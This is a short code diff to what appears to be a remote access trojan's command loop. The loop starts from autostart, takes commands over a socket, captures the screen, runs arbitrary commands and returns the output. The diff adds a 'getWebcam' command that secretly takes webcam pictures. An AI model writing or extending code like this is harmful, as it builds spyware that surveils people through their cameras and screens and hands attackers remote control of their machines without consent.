@@ -659,6 +659,8 @@ def from_autostart():
                             stdoutput = start_child_socket(str(data.split(' ')[-1]), mode)
                         elif data == 'getScreen':
                             stdoutput = get_screenshot()
+                        elif data == 'getWebcam':
+                            stdoutput = webcam_shot()
                         else:
                             stdoutput = exec_(data)
                         send(s, stdoutput, mode=mode)
